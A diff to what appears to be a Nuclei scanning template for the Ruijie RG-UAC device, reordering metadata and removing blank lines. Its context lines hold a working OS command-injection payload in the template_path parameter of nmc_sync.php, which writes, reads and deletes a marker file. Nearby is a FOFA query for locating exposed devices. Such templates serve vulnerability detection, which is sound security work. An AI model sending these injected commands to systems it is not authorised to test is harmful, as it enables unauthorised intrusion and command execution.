@@ -13,11 +13,10 @@ info:
   metadata:
     verified: true
     max-request: 3
-    fofa-query: title="RG-UAC登录页面" && body="admin"
-    product: rg-uac
     vendor: ruijie
+    product: rg-uac
+    fofa-query: title="RG-UAC登录页面" && body="admin"
   tags: rg-uac,file-upload,intrusive,ruijie
-
 variables:
   random_str: "{{rand_base(6)}}"
   match_str: "{{md5(random_str)}}"
@@ -27,11 +26,9 @@ http:
       - |
         GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat HTTP/1.1
         Host: {{Hostname}}
@@ -42,4 +39,3 @@ http:
           - "status_code_1 == 200 && status_code_2 == 200"
           - "contains(body_2, '{{match_str}}')"
         condition: and
-
